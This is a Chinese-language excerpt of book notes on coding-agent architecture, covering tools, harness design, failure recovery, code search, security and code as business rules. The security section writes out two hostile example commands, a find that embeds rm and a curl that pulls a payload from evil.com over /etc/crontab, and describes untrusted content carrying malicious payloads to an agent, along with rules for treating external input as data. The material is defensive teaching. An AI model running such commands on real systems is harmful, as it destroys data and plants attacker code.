
> 本章回答一个核心问题：**一个能处理任意任务的通用 Agent，它的架构长什么样？**
> 答案：**以开放任务为目标的通用 Agent，其核心是一个 Coding Agent 加上文件系统。**
> 从 Manus 到 OpenClaw，成功的开放任务型通用 Agent 都遵循这一范式。

---
## 一、总纲：为什么 Coding Agent 是通用 Agent 的核心？

### 1.1 核心公式

**通用 Agent = Coding Agent + 文件系统**

- Coding Agent：能自主编写、修改和执行代码的 Agent。
- 文件系统：Agent 用来存储代码、数据、记忆和中间结果的工作空间。

### 1.2 为什么代码生成能担此重任？

**因为代码生成不只是一个工具，而是一种元能力——能在运行时动态创造出新的工具和能力。**

### 1.3 代码对 Agent 的价值

| 层面 | 说明 |
|---|---|
| **思考** | 形式化代码让思考高度严谨——"年龄大于18且已实名认证"写成代码就毫无歧义 |
| **表达** | 一段能跑通的代码本身就是逻辑自洽的证明，执行结果提供客观的对错标准 |

## 二、5.1.1 Coding 是 Agent 的基础能力

### 2.1 核心观点

**代码生成不是少数专门化 Agent 的专利，而是每个通用 Agent 都该具备的基础能力。**

### 2.2 七个核心工具

| 工具 | 作用 |
|---|---|
| **Code Interpreter** | 提供隔离的沙盒环境，安全执行 Python 代码 |
| **Bash Shell** | 在终端中执行命令，如运行测试用例、处理特殊格式文件 |
| **读文件工具** | 读取代码、配置、文档、日志等 |
| **写文件工具** | 创建新文件或完全重写现有文件 |
| **编辑文件工具** | 对现有文件进行局部修改，是代码维护和迭代的核心操作 |
| **搜索文件名工具（Glob）** | 通过模式匹配快速定位文件系统中的目标文件 |
| **搜索文件内容工具（Grep）** | 在文件内容中搜索特定的文本模式 |

### 2.3 七个工具的配合示例

**任务：** "帮我把项目里所有 TODO 注释整理成一个清单"

```
Agent（思考）：需要找到所有包含 TODO 的代码行。
Agent → Grep("TODO", glob="**/*.py")
工具返回：
  src/api.py:42: # TODO: add rate limiting
  src/db.py:15: # TODO: migrate to PostgreSQL
  tests/test_api.py:8: # TODO: add edge case tests

Agent（思考）：找到了 3 个 TODO，整理成清单写入文件。
Agent → Write("TODO_LIST.md", content="...")
工具返回：文件已创建

Agent：已整理完毕，共发现 3 个 TODO 项，清单保存在 TODO_LIST.md。
```

### 2.4 为什么是七个工具，不是六个？

> 事实上，只要一个 Bash Shell 工具就足够了。OpenAI Codex 就只提供 Bash Shell 一个工具，用这一个工具完成所有文件读写、查找操作。但其他一些 Agent 仍然保留单独的文件读写工具。本书的七个工具是为了方便读者理解 Coding Agent 所需的基本能力。

### 2.5 为什么每个通用 Agent 都应该具备 coding 能力？

因为代码生成是一种通用的问题解决手段：

| 场景 | 做法 |
|---|---|
| 数学推理 | 写段代码交给求解器算出精确答案 |
| 固化业务规则 | 代码比自然语言描述精确得多 |
| 缺少某个工具 | 临时写一个 |
| 数据格式变了 | 动态生成解析逻辑 |

**一个具备基本 coding 能力的 Agent，即使工具箱中只有上述七个简单工具，也能在遇到新需求时动态扩展自己的能力边界。**

## 三、5.1.2 案例：从 Manus 到 OpenClaw——通用 Agent 的 Coding 内核

### 3.1 为什么 Coding Agent 是核心，而不是 Deep Research 或 Computer Use？

**因为几乎所有高效的内容生成最终都要落到代码上。**

| 产物 | 本质 |
|---|---|
| PPT、Word 文档 | OOXML 格式的代码 |
| PDF 报告 | 通过 Markdown、HTML 或 LaTeX 生成 |
| 数据分析和可视化 | 由 Python 脚本完成 |
| GUI 操作 | 成功的浏览器操作序列可固化为可复用代码 |
| Deep Research | 搜索和信息综合可通过代码驱动的 Web 请求和解析实现 |

**Computer Use 虽然通用性更强，但成本、延迟和稳定性远不如直接通过代码或 API 来完成相同操作。代码生成是效率最高、成本最低、可复用性最强的能力基座。**

### 3.2 具体执行流

**用户要求：** "Help me analyze last quarter's sales data and create a summary report"

```
1. 读记忆：Agent 读取 MEMORY.md，发现用户偏好 PDF 格式的报告，数据源是 Google Sheets
2. 调工具：通过网络搜索模块获取 Google Sheets API 的使用方法，通过代码执行下载数据
3. 写代码：用 Python 生成数据分析脚本（pandas 聚合、matplotlib 可视化）
4. 生成产物：将分析结果写入 report.pdf，图表写入 charts/ 目录
5. 更新记忆：在 MEMORY.md 中记录"User's sales data is in Google Sheets, ID: xxx"
```

### 3.3 文件系统作为 Agent 的中枢

**长期记忆存储：**

| 文件 | 内容 |
|---|---|
| MEMORY.md | 高层级事实和用户偏好 |
| 按日期归档的 Markdown 日志 | 详细事件记录 |

**为什么选择 Markdown 而非向量数据库？**

- 用户可以直接打开文件阅读和修改 Agent 的记忆。
- Markdown 天然保留时间顺序，避免语义检索中的时间混淆。
- 可通过 Git 进行版本控制和回滚。

**更关键的是：** Agent 拥有写文件的能力，这意味着它具备了修改自身外部产物的技术条件。

### 3.4 适用边界

| Agent 类型 | Coding 的角色 |
|---|---|
| 开放任务型通用 Agent | 架构核心 |
| 垂直领域客服 Agent | 工具箱里的一件工具，而非架构中枢 |

**但即便在后者，coding 也是重要的基础能力：精确计算、数据处理、规则校验都离不开它。**

## 四、5.1.3 Coding Agent 的整体流程（图5-2）

### 4.1 五阶段流程

```
① 项目文档化 → ② 需求理解 → ③ 设计文档 → ④ 编码与测试 → ⑤ 审查与交付
```

### 4.2 项目文档化

**核心原则：知识的显式化是高效协作的前提。**

**项目指令文件（Agent 专用形态）：**

| 文件 | 作用 |
|---|---|
| CLAUDE.md | 项目级系统提示词 |
| AGENTS.md | 行为约定 |
| .cursorrules | 代码风格、禁区 |

**与 OpenClaw 的对应：**

| 文件 | 约定什么 |
|---|---|
| SOUL.md | Agent 是谁 |
| MEMORY.md | 跨会话经验 |
| 项目指令文件 | 在这个项目里该怎么干活 |

**评估团队"AI-ready"程度的简单指标：一个远程新人只靠代码仓库和文档，能不能独立开展工作。**

### 4.3 任务理解与需求澄清

- **简单需求**：直接进入实现阶段。
- **复杂需求**：通过探索性调研来澄清边界，必要时主动与用户对话。

**在需求模糊的状态下就开始编码，往往导致大量返工。**

### 4.4 编写设计文档

**设计文档应回答：**

- 修改哪些模块及原因？
- 采用什么方案及其相对优势？
- 需引入哪些新依赖？
- 预期对系统的影响？

**审查简洁的设计文档比审查数百行代码容易得多。**

### 4.5 代码实现与测试

- 遵循项目代码规范进行实现。
- 实现完成后立即进入测试驱动的质量保障环节。
- 如果测试失败，分析原因、定位问题、修改代码直到所有测试通过。
- **把"测试通过"而非"代码写完"定义为完成标准。**

### 4.6 文档同步与交付

- 如果代码修改涉及架构层面的变化，Agent 需相应更新架构文档。
- **过时的文档比没有文档更糟糕。**

### 4.7 不同模型的裁剪方式

| 模型 | 行为 |
|---|---|
| 有些模型 | 第一次修改前广泛阅读目录、实现、调用方和测试 |
| 另一些模型 | 读少数最可能相关的文件，马上提交补丁，再把编译与测试反馈当作调查的一部分 |

**它首先是模型学到的行为策略，而不只是 Coding 产品的界面风格。**

### 4.8 闭环反馈机制（图5-2）

| 反馈类型 | 说明 |
|---|---|
| 测试失败 → 修改代码 → 重新测试 | 内循环：平均 2-3 轮收敛 |
| Lint 错误 → 即时修复 → 再检查 | 内循环：编辑后自动触发 |
| 审查发现问题 → 回到④修改 | ⑤→④回退：保证交付质量 |

**Agent 状态栏**：cwd, git branch, 未暂存变更
**工具输出**：头尾截断
**持久化终端会话**

## 五、5.1.4 Harness 工程在 Coding Agent 中的实践

### 5.1 核心公式

**Agent = Model + Harness**

**Harness = 上下文管理 + 工具接口 + 约束 + 验证 + 纠正**

### 5.2 四个工程组件

| 组件 | 说明 |
|---|---|
| **验收基线** | 什么算做完了——测试套件、CI 管道、代码审查标准 |
| **执行边界** | Agent 能碰什么不能碰什么——模块边界、依赖规则、权限控制 |
| **反馈信号** | 自动化的对错判断——Linter 输出、测试结果、类型检查错误 |
| **回退手段** | 出了问题怎么恢复——Git 版本控制、沙盒隔离、快照回滚 |

### 5.3 任务清晰度与验证自动化程度的四象限

| | 结果可自动验证 | 结果需人工验证 |
|---|---|---|
| **目标明确** | 最佳区域：修复有测试用例的 bug | 吞吐量受限：代码重构需人工审查 |
| **目标模糊** | 高效地跑偏：用 linter 优化"代码质量" | 难以启动："让 UI 更好看" |

**代码编写天然处于最佳区域的核心。**

### 5.4 业界实践

| 案例 | 关键做法 |
|---|---|
| **大规模代码迁移** | 知识必须存在于代码库本身、约束编码进 Linter 和 CI、验证和纠正全链路自动化 |
| **LangChain** | 仅通过优化 Harness 显著提升表现；"用 Agent 分析失败轨迹来改进 Harness" |
| **Anthropic** | 将长任务拆分为初始化 Agent 和执行 Agent |

### 5.5 从 Coding Agent 到通用 Harness 设计原则

1. **约束优先于指导**：能用代码强制的规则就不要用文档建议。
2. **验证要自动化**：人工审查是不可扩展的瓶颈。
3. **反馈越快越好，越结构化越好**。
4. **回退要可靠**：Agent 在安全网内操作才能大胆试错。

### 5.6 约束的另一层目的：防止过程性错误

**破坏性捷径总是存在：**

- 修复数据库故障时直接把库删了重建。
- 修复编译错误时把代码全删重写。

**生产级 Harness 要对 `rm -rf`、删除生产数据、覆盖未读文件这类危险动作设置专门的检查与审批。**

### 5.7 工具编排：故障边界控制

**原则：故障只在同一批并行调用内传播，不上升到父级操作。**

- 同时读取三个文件，其中一个找不到 → 只报告这一个失败。
- 不把另外两个也取消掉。
- 更不是让整个任务中止。

## 六、5.1.5 故障与错误恢复

### 6.1 故障分类学：四层故障

| 层次 | 故障类型 |
|---|---|
| **API 层** | 限流（HTTP 429）、服务过载、请求超时、连接中断、输出触顶被截断 |
| **工具层** | 幻觉调用、参数畸形、执行抛异常、工具反复返回同一个错误 |
| **上下文层** | 上下文窗口溢出、压缩失败、轨迹结构损坏 |
| **控制流层** | 死循环、死亡螺旋 |

### 6.2 检测：先分类，再计数

**第一个判断不是"要不要重试"，而是"值不值得重试"。**

| 错误类型 | 是否可重试 |
|---|---|
| 限流、过载、网络抖动 | 可重试 |
| 参数不合法、权限不足、工具不存在 | 不可重试 |

**检测模式：**

- 重复调用指纹：对"工具名 + 参数"计算指纹。
- 连续失败计数：每条恢复路径维护独立的计数器。

**活性与完整性监控：**

- 空闲看门狗（watchdog timer）：超过设定时间没有新输出就判定为卡死。
- 完整性监控：发现工具调用缺少配对的结果消息时，自动修复配对关系。

### 6.3 恢复：分级升级，逐级透明

| 级别 | 做法 |
|---|---|
| **静默重试** | 指数退避叠加随机抖动；区分前台与后台调用 |
| **降级与接续** | 输出触顶时提升上限重发；主模型过载时降级到备用模型 |
| **暴露给用户** | 所有自动手段用尽后才呈现错误 |

**工具层错误走另一条路：不终止会话，把错误变成模型的输入。**

### 6.4 接管：把没跑完的轨迹交给另一家模型

**真正的障碍：轨迹里有一部分东西只属于原厂商。**

| 组成部分 | 是否可移植 |
|---|---|
| 工具调用与工具结果 | 结构不同但语义一致，重新渲染即可 |
| 思考的文字 | 可移植 |
| 思考的凭证 | 不可移植 |

**设计原则：轨迹不该按任何一家的接口格式存储，而应保存为一份中立格式。**

**实验 5-1：跨厂商的轨迹接管**
**实验 5-2：输出到一半断掉之后的接续**

### 6.5 终止：每条恢复路径都要有上限

**阈值从生产数据来，而非拍脑袋。**

- Claude Code 的压缩熔断："连续 3 次"。
- 曾有一个会话在这条恢复路径上连续失败三千余次。
- 逾千个会话出现过 50 次以上的连续失败。

**死亡螺旋的防护：**

- 在错误路径上禁用一切会再次调用模型的副作用逻辑。
- 用递归深度计数器检测并打断残余的连锁。

## 七、5.1.6 Coding Agent 的实现技巧

### 7.1 并行工具调用、流式执行与级联中止

- 第一个工具调用的参数一经完整生成并通过校验，即可立即开始执行。
- 彼此独立的调用之间可并行执行。
- 级联中止：终止同一批并行启动且依赖该结果的其他调用。

### 7.2 上下文的精细化管理

| 层面 | 做法 |
|---|---|
| **文件读取** | 按行号范围读取特定片段；附加行号标注 |
| **命令执行** | 长输出截断与持久化：保留前若干行和后若干行 |

### 7.3 环境信息的动态注入

**每次推理前在上下文末尾注入：**

- 当前工作目录
- git 分支
- 最近提交记录
- 未暂存和已暂存的变更概览

**这些信息不应硬编码在静态系统提示词中，而应作为动态的、追加式的 Agent 状态栏实时生成并注入。**

### 7.4 命令执行环境的状态持久化

**维护一个持久化的终端会话，在 Agent 启动时创建并在整个交互过程中保持活跃。**

### 7.5 即时的语法反馈机制

**文件写入操作一完成，工具层就自动运行相应的 linter 或语法检查器。**

## 八、5.1.7 Coding Agent 中的搜索工具（图5-3）

### 8.1 四种搜索方式

| 方式 | 查询示例 | 特点 |
|---|---|---|
| **正则表达式内容匹配（grep）** | `rg "def handle_.*" --type py` | 精确文本 → 所有出现位置 |
| **文件名模式匹配（glob）** | `glob: **/test_*.py` | 路径模式 → 不读取文件内容 |
| **语义代码搜索** | "处理用户输入验证" | 自然语言 → 向量+BM25混合 |
| **符号级定义与引用查找** | `find_references: UserService` | AST级 → 消除同名歧义 |

### 8.2 语义代码搜索的两个关键问题

- **结构感知的分块**：按函数、类、方法等完整语义单元切分。
- **混合检索**：向量嵌入 + 关键词匹配 + 重排序模型。

### 8.3 路线之争

| 工具 | 路线 |
|---|---|
| Claude Code | 纯 agentic 的 grep + glob 现场检索 |
| Cursor（早期） | 嵌入索引 |
| Cursor（现在） | grep + glob 现场检索 |

### 8.4 组合使用策略

**"从粗到细、从语义到语法"的渐进式策略：**

1. 先用语义搜索找到相关模块。
2. 再用正则匹配精确定位具体代码行。
3. 最后通过符号搜索追踪调用链。

## 十、5.1.9 Coding Agent 的安全

### 10.1 致命三要素

1. **访问私有数据**——Agent 能读取用户文件和密码管理器。
2. **暴露于不受信任内容**——处理的邮件和网页可能包含恶意载荷。
3. **具备外部通信能力**——能发送邮件和执行命令。

**笔者补充第四个维度——持久记忆：** 攻击的放大器，跨会话潜伏。

### 10.2 四类边界

| 边界 | 说明 |
|---|---|
| 数据边界 | 访问私有数据 |
| 输入信任边界 | 暴露于不受信任内容 |
| 输出影响边界 | 具备外部通信能力 |
| 跨会话边界 | 持久记忆 |

### 10.3 三项补充措施

| 措施 | 层面 |
|---|---|
| 命令语义解析 | 验证层 |
| 沙盒隔离与网络出口控制 | 执行层 |
| 持久记忆的跨会话防线 | 数据层 |

### 10.4 隔离兜底：代码执行沙盒的工程选型

| 措施 | 说明 |
|---|---|
| **网络出口控制** | 默认断网，按需通过白名单代理放行 |
| **文件系统隔离范围** | 源码目录只读挂载；凭证类文件根本不挂载 |
| **资源限额与超时** | CPU、内存、磁盘配额加超时；返回结构化错误 |

### 10.5 安全：语义解析而非关键字黑名单

| 攻击示例 | 说明 |
|---|---|
| `find / -name '*.log' -exec rm {} \;` | 通过合法的 find 命令参数嵌入 rm |
| `curl -o /etc/crontab http://evil.com/payload` | 看似下载文件实则覆盖系统定时任务 |

**生产级 Harness 采用语义解析：理解每个命令的参数类型和消费规则。**

### 10.6 Agent 为谁效忠：多方委托下的忠诚度

**委托方忠诚（principal loyalty）：Agent 到底站在谁那一边。**

**忠诚度光谱的两端都会翻车：**

| 一端 | 另一端 |
|---|---|
| 太老实，把主人的私密信息直接抖给对手 | 太多疑，连主人正当的请求也一概拒绝 |

**Harness 层要明确限定"忠诚对象"：**

- 主人的指令优先级最高。
- 一切来自外部交互方的内容都默认降格为"可参考、但不具备指令效力"的数据。

**忠诚度守则：**

- 保护主人的私密信息，甚至不泄露这些信息是否存在。
- 拒绝时不逐条念出拒绝清单。
- 私下的底线不等于对外的立场。
- 只执行主人明确、具体的指令。
- 顶住重复施压。

## 十一、5.2.1 代码作为思考工具

### 11.1 核心问题

LLM 在自然语言理解和生成上表现惊人，但在**精确计算、符号操作或严格逻辑推导**上却有根本短板。原因在于：**模型思考本质上是概率性的、近似的，而数学和逻辑问题要求确定性的、精确的答案。**

### 11.2 分工模式

> 让 LLM 负责理解问题并写出代码，让代码解释器负责精确计算——这种分工让两者各司其职。

### 11.3 Stephen Wolfram 的洞察

- 符号计算系统（如 Wolfram Alpha）能做精确数学计算，但自然语言理解脆弱、覆盖面窄。
- LLM 擅长理解自然语言，但不擅长精确计算。
- **新协同模式**：LLM 负责理解问题，转化为形式化语言（如 Mathematica 语言或 Python 的 SymPy 库），交给符号计算引擎或约束求解器执行，获得精确结果。

### 11.4 实验 5-3：使用代码生成工具提升数学解题能力

| 项目 | 内容 |
|---|---|
| **目标** | 验证 Agent 通过 Code Interpreter 辅助数学思考的准确性提升 |
| **技术方案** | 为 Agent 配备安装了 sympy、numpy、scipy 等数学库的 Python 沙盒。Agent 将数学问题形式化为 Python 代码，在沙盒中执行并返回精确结果 |
| **验收标准** | 使用 AIME 风格题目评测，对比纯思维链思考和代码辅助思考的准确率，要求代码辅助模式显著更高 |

### 11.5 实验 5-4：使用代码生成工具提升逻辑思考能力

| 项目 | 内容 |
|---|---|
| **目标** | 评估 Agent 通过约束求解代码辅助逻辑思考的能力 |
| **技术方案** | 为 Agent 配备包含 python-constraint 库的 Code Interpreter。Agent 将逻辑谜题转化为形式化约束定义，调用求解器搜索满足所有约束的解 |
| **验收标准** | 使用 K&K Puzzle 数据集评测，代码辅助模式求解准确率达 90% 以上，显著高于纯思考模式 |

### 11.6 模型与脚手架的关系

> 这个实验还揭示了一个更普遍的规律：**模型与脚手架（harness）之间是此消彼长的关系。**
> - 模型足够强时，脚手架可以更薄——模型自己就能把逻辑想对，代码求解器带来的增益随之收窄。
> - 模型不够强时，就得在脚手架里做更多事情——把关键的逻辑推理交给代码和约束求解器来保证正确性。

**结论**：脚手架该做多厚，取决于你手上模型的能力边界。同一套脚手架，配上不同能力的模型，得到的结论可能截然不同。

## 十二、5.2.2 代码作为业务规则的约束

### 12.1 核心原则

> Harness 的核心原则之一是"**约束：编码化而非文档化**"——将规则从自然语言文档转化为可执行的代码，使其成为系统行为的强制约束而非建议性指南。

### 12.2 自然语言 vs 代码化规则

| 自然语言规则 | 代码化规则 |
|---|---|
| 模型可基于规则向用户解释政策 | 精确性和无歧义性——不会出现"理解偏差" |
| 可根据规则寻找变通方案 | 执行具有确定性——相同输入必产生相同输出 |
| 可在调用工具前初步判断可行性 | 特别适合复杂规则组合——多条件布尔组合、时间计算、跨数据源验证 |

**实践中应结合使用**：系统提示词包含自然语言规则供理解和沟通，关键决策点配备代码化校验工具作为"守门员"确保合规性。

### 12.3 合并校验与执行：checklist 引导思考，真值校验守门

以 τ-bench 中的航空公司取消政策为例：

```python
def cancel_reservation(
    reservation_id: str,
    cancellation_reason: str,
    expected_cabin_class: str = None,   # 模型自查用
    expected_has_insurance: bool = None # 模型自查用
) -> dict:
    """
    取消政策（服务端根据数据库真值强制执行）：
    - 规则1：已使用任何航段的订单不可取消
    - 规则2：预订后24小时内可无条件取消
    - 规则3：航空公司取消的航班总可取消
    - 规则4：商务舱总可取消
    - 规则5：基础经济舱和经济舱需购买旅行保险才可取消
    调用前请先查询订单详情，逐条核对上述政策；expected_*参数用于
    陈述你的判断依据，仅供服务端比对与审计，不影响政策裁决。
    """
    # 所有政策事实一律从数据库读取，绝不采信模型自报的值
    r = db.get_reservation(reservation_id)
    now = server_clock.now()
    # 模型自报值与真值不一致时记录告警
    if expected_cabin_class is not None and expected_cabin_class != r.cabin_class:
        log_mismatch(reservation_id, "cabin_class", expected_cabin_class, r.cabin_class)
    if expected_has_insurance is not None and expected_has_insurance != r.has_insurance:
        log_mismatch(reservation_id, "has_insurance", expected_has_insurance, r.has_insurance)
    if r.any_segment_used:
        return {"success": False, "reason": "Cannot cancel with used segments"}
    hours_since_booking = (now - r.booking_time).total_seconds() / 3600
    if hours_since_booking < 0:
        return {"success": False, "reason": "Booking time is in the future"}
    if hours_since_booking <= 24:
        execute_cancellation(reservation_id)
        return {"success": True, "reason": "Cancelled within 24-hour window"}
    if r.flight_status == "cancelled_by_airline":
        execute_cancellation(reservation_id)
        return {"success": True, "reason": "Airline cancelled flight"}
    if r.cabin_class == "business":
        execute_cancellation(reservation_id)
        return {"success": True, "reason": "Business class cancellation"}
    if r.cabin_class in ["basic_economy", "economy"]:
        if r.has_insurance:
            execute_cancellation(reservation_id)
            return {"success": True, "reason": f"{r.cabin_class} with insurance"}
        return {"success": False, "reason": f"{r.cabin_class} requires insurance"}
    return {"success": False, "reason": "Does not meet cancellation policy"}
```

**两层价值：**

- **第一层：参数作为思考的 checklist**——工具描述中列出完整政策，要求模型"调用前先查询订单详情、逐条核对"；可选的 `expected_*` 参数促使模型把判断依据显式写出来。
- **第二层：服务端真值校验才是守门员**——舱位等级、保险状态、预订时间、航段使用情况、航班状态全部由服务端查询数据库获得。

**三重保障：**

1. 系统提示词的自然语言规则帮助理解和解释。
2. 工具描述与参数设计作为 checklist，引导模型在调用前显式核对条件。
3. 服务端基于数据库真值的代码化校验作为最后守门员。

### 12.4 实验 5-5：小模型通过代码化知识提升执行规则的准确性

| 项目 | 内容 |

| **目标** | 验证小参数量模型（Qwen3-4B）通过代码化业务规则显著提升复杂政策执行的准确性和一致性 |

### 13.2 PPT 生成 Agent

  - 迭代直到质量达标或达到最大迭代次数（如 5 轮）。
- **双 Agent 分工的核心优势**：上下文管理。Reviewer 每次只处理最新版本的渲染图片，不受历史版本干扰；Proposer 仅累积结构化文本反馈。

### 13.3 视频编辑 Agent

- 把视频编辑重构为 API 调用和代码生成问题。
- 专业软件（如 Blender、FFmpeg）提供程序化 API 接口。
- **两步定位策略**：
  1. 粗粒度定位：调用子 Agent 传入视频路径、每 10 秒截图间隔、目标问题，返回场景区间。
  2. 精细粒度定位：缩小时间范围，以每秒一张的密度截图，再次调用子 Agent，精确定位边界时间点。

| 维度 | 代码生成 | 3D 生成模型 |
|---|---|---|
| 精确描述 | 工业零件有紧凑的精确描述 | 绿植、人脸等内在复杂度近乎无限 |

**决策依据**：掂量产物的内在复杂度和精度要求，把任务分给代码生成或者 3D 生成模型。

### 15.5 生成 SQL 查询：Artifact 模式（图5-9）

**传统模式 vs Artifact 模式：**

| 维度 | 传统模式 | Artifact 模式 |
|---|---|---|
| 数据路径 | DB → LLM → 用户 | DB → 前端 → 用户（绕过 LLM） |
| LLM 角色 | 生成 SQL + 阅读数据 + 文字描述 | 只生成代码，不参与数据传递 |
| 问题 | LLM 抄写数据易出错、消耗大量 token、延迟高 | 快速、准确 |

**Artifact 模式流程：**

```
LLM 只生成代码（SQL 查询 + 可视化代码）
    ↓
前端直接执行 SQL
    ↓
可视化 Artifact（柱状图等）
    ↓
数据流：DB → 前端 → 可视化（完全绕过 LLM）
```

**安全约束**：

- 只读数据库账号
- 只允许经过批准的 SELECT 语句
- 拒绝 DDL、DML 和多语句查询
- 用户提供的值由服务端参数化绑定
- 限制查询时间、返回行数、可访问的表和时间范围
- 可视化代码在隔离沙盒中运行

- **实验 5-13**：自然语言交互的 ERP Agent。

### 15.6 动态生成软件：信任边界下移到数据层

- **安全目标**：即使 AI 写错了代码，权限约束仍然无法被绕过。
- **数据层护栏**：数据库行级安全策略、约束和校验器、受控视图与存储过程、访问上下文。
- **关键原则**：把信任边界下移到数据层——第一章三层护栏中最难被绕过的那一层。
- **实验 5-14**：对话式界面定制系统。
- **实验 5-15**：动态生成软件的权限内嵌数据对象。

### 16.3 让 Agent 编写 Agent 的关键技巧

**常见缺陷：**

2. 工具设计的不规范
3. 技术选型的滞后性
4. 外部生态的脱节

**最有效路径**：提供高质量的 Agent 实现作为参考范例，引导代码生成 Agent 在此基础上修改，而非从零开始。

**"基于范例的生成"优势**：范例代码本身就是最佳实践的载体，架构上的好选择会自然保留下来。

```

    ↓ 复制 + 修改
新 Agent（定向修改后）

原始 Agent：系统提示词（航空客服、取消规则、转接规则）、Agent 框架代码（loop、msg=llm(ctx)、if tool_call: exec(tool)）、工具定义+MCP集成+消息格式

```

## 十七、5.3 本章小结

> 本章讨论的核心始终是同一件事：**代码不只是写程序的工具，它是 Agent 形式化思考和精确表达的语言。**
> Harness 工程那一节的核心结论是：**Coding Agent 之所以成熟度高，不是因为代码生成模型特别强，而是因为软件工程几十年攒下的基础设施——测试套件、类型系统、版本控制——天然构成了一套强大的 Harness。这个结论值得推广到其他 Agent 场景。**
> 故障与错误恢复一节则给出了同一主题的另一面：**Agent 的可靠性不取决于模型犯不犯错，而取决于每类故障是否都有对应的检测、恢复、接管与终止路径。**
> 第二部分展示了代码生成在编程之外的广泛价值，对应正文的六个维度：
> - **思考工具**：借助符号计算和约束求解弥补概率思考的不足。
> - **业务规则约束**：以无歧义方式表达业务规则，在不可逆操作场景中提供确定性安全防线。
> - **多媒体生成**：通过提议者-审核者机制创建 PPT、视频等多模态内容；代码生成与生成模型的选择取决于产物的内在复杂度与精度要求。
> - **系统适配器**：跟随格式演化，自动完成日志解析和问题诊断。
> - **生成式 UI**：动态创建表单、可视化图表甚至完整可定制应用，突破纯文本限制。
> - **Agent 自举**：用代码修复和创造同类 Agent，实现能创造 Agent 的 Agent。
> 代码对 Agent 的价值在于：**它既是完成任务的手段，也是积累知识、创造工具、优化自身的机制。**
> 至此，我们已经把上下文、知识、工具与代码能力组合成通用 Agent 的基础架构，而代码生成正是其中通用性最强的元能力。但前五章仍默认 Agent 与世界轮流行动。第六章将补上"构建 Agent"的最后一块，把观察与动作空间扩展到异步事件、语音、屏幕和物理世界；完成这一步后，第七章再转向评估与持续改进。

## 十八、第5章思考题深度解析

### 18.1 ★★ 代码生成的"元能力"与安全风险：如何平衡？

**第一性原理：** 安全与能力的矛盾本质是：**代码能做什么 vs 代码被允许做什么。**

**两种极端：**

| 极端 | 做法 | 后果 |
|---|---|---|
| 完全开放 | 不隔离，任意访问 | 安全风险极高 |
| 完全隔离 | 断网、只读、无文件系统 | 代码能力被严重限制 |

**平衡方案：分层隔离**

```
第一层：只读沙盒（最低风险）
  - 无网络、只读文件系统
  - 适用：数学计算、数据分析

第二层：受控沙盒（中等风险）
  - 白名单网络、可写工作目录
  - 适用：代码生成、API 调用

第三层：全功能沙盒（较高风险）
  - 完整网络、完整文件系统
  - 适用：需要真实环境的任务

第四层：本地执行（最高风险）
  - 直接在本机执行
  - 适用：Coding Agent 等需要真实环境
```

**书中对应：**

> 网络出口控制——默认断网，按需通过白名单代理放行有限目的地。回看致命三要素的第3条——"具备外部通信能力"——网络出口控制正是它的执行面防御。

**关键原则：** 安全不是"能不能做"，而是"在什么条件下能做"。

**费曼式类比：** 你给一个实习生权限：刚来时只能看文件，不能改；熟悉后可以改文件，但不能访问网络；信任后可以访问网络，但必须通过代理。权限随信任度逐步放开。

### 18.2 ★★★ Agent 自举：错误会在代际间累积吗？如何防止退化？

**第一性原理：** 自举是**复制 + 变异**。变异可能引入错误。错误的累积取决于**选择压力**。

**错误累积的机制：**

| 机制 | 说明 |
|---|---|
| 遗传漂变 | 小错误随机累积 |
| 选择偏差 | 如果评估标准有偏，错误会被放大 |
| 丢失多样性 | 每次都基于前一代，多样性下降 |
| 缺乏纠错 | 没有机制检测和修正错误 |

**防止退化的四条路径：**

| 路径 | 做法 |
|---|---|
| **保留集** | 用原始 Agent 的能力作为基准，检测退化 |
| **多样性维护** | 保留多个分支，不只有一个谱系 |
| **外部审查** | 由人类或独立 Agent 审查每一代 |
| **回归测试** | 每一代都必须通过所有测试 |

**书中对应：**

> "基于范例的生成"优势明显：范例代码本身就是最佳实践的载体，Agent 基于范例修改比从零编写更容易做对，架构上的好选择会自然保留下来，而不需要在提示词里把每一条规则都说清楚。

**关键原则：** 自举不是"复制自己"，而是"基于经过验证的范例修改"。范例是稳定性来源，修改是能力来源。

**费曼式类比：** 生物学中的基因复制加变异：复制保留核心架构，变异调整系统提示词、替换工具。但要有选择压力——不好的变异被淘汰。Agent 自举也需要选择压力——回归测试、保留集、外部审查。

### 18.3 ★★ 格式变化是 bug 还是预期改动？如何区分？

**第一性原理：** 核心区分：**变化是否与预期一致。**

**判断框架：**

| 维度 | 预期改动 | Bug |
|---|---|---|
| 来源 | 上游系统的变更日志 | 没有变更日志 |
| 时间 | 有计划的发布时间 | 突然发生 |
| 影响 | 只影响特定字段 | 影响多个字段 |
| 一致性 | 新格式在多个样本中一致 | 新格式不一致 |
| 回滚 | 可以回滚 | 无法回滚 |

**解决方案：**

```
第一层：检测变化
  - 前端检测解析失败
  - 记录失败样本

第二层：判断变化类型
  - 如果有变更日志：预期改动 → 适应
  - 如果没有变更日志：
    - 如果变化一致：可能是预期改动 → 适应 + 告警
    - 如果变化不一致：可能是 bug → 报告 + 不自动适应

第三层：人工确认
  - 不确定时，请求人工确认
```

**关键原则：** 不是所有变化都应该适应。有些变化需要报告，而不是掩盖。

**费曼式类比：** 你家的水龙头漏水：如果是密封圈老化（预期磨损），换密封圈（适应）；如果是水管爆裂（bug），报告物业，而不是继续用水（报告）。不是所有漏水都要自己修。

### 18.4 ★★ Reviewer 的审美偏好与用户不一致：如何让用户参与？

**第一性原理：** Reviewer 的目标是**最大化用户满意度**，而不是**最大化自己的审美标准**。

**问题：**

| 角色 | 偏好 |
|---|---|
| Reviewer | 信息密度合理 |
| 用户 | 信息密度太低，太拥挤 |

**解决方案：三层反馈**

```
第一层：Reviewer 自动审查
  - 检查基本问题：文字溢出、布局错乱
  - 基于通用审美标准

第二层：用户偏好注入
  - 收集用户历史偏好：喜欢什么样的风格
  - 在 Reviewer 的 Rubric 中加入用户偏好维度

第三层：用户直接反馈
  - 用户可以直接给 Reviewer 反馈
  - 反馈进入 Reviewer 的评估标准
  - 迭代改进
```

**关键原则：** Reviewer 不是最终裁判，用户才是。Reviewer 的价值在于自动化，但不应该替代用户判断。

**费曼式类比：** 你请一个装修监理：监理说"这个设计很合理"，但你不喜欢。监理应该问你的偏好，而不是坚持自己的标准。监理的职责是帮你实现你的目标，而不是他的目标。

### 18.5 ★★ 规则的"垃圾回收"：如何清理冗余或过时条目？为什么一次成功修改不等于持续进化？

**第一性原理：** 规则集膨胀的根本原因是**没有淘汰机制**。垃圾回收的本质是**定期审查和淘汰**。

**垃圾回收的四个步骤：**

| 步骤 | 做法 |
|---|---|
